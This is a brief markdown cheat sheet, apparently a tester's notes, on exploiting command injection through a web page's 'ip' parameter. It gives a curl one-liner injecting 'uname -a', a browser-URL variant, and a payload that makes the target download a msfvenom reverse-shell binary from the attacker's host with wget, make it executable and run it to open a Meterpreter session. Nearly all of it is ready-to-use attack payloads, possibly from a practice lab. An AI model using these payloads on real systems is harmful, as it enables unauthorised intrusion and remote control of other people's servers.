# Curl

### If the web application is vulnerable to Command Injection...

### From a terminal this will filter Curl and only print the OS and architecture of the web application host.
```
curl http://<IP>/<Subdirectory>/example1.php?ip=";uname%20-a" 2>&1 | awk '/<pre>/{flag=1;next}/pre>/{flag=0}flag'
```
Alternatively you can also just enter "uname -a" directly into the web browser address bar in this format.
```
http://<IP>/<Subdirectory>/example1.php?ip=127.0.0.1;uname -a
```

### This example is a series of commands to get your target to download an exploit. I created a reverse shell using msfvenom, loaded a payload in Metasploit, launched a Python SimpleHTTPServer, then appended the below script to the web browsers address bar. If properly executed Metasploit spawn a Meterpreter session.
```
ip=127.0.0.1;wget%20-O%20/tmp/cmd%20http://192.168.145.128/cmd;chmod%20755%20/tmp/cmd;/tmp/cmd
```
